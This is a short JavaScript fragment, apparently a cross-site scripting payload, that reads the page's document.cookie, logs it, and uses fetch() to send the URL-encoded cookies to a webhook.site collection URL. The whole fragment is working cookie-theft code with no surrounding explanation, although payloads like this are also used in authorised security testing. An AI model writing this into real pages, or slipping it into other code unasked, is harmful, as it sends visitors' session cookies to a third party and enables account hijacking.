console.log("Cookies:", document.cookie);

    fetch(
      "https://webhook.site/400ff12c-64dd-445b-ae1d-1059427d00fe?cookies=" +
        encodeURIComponent(document.cookie),
    );
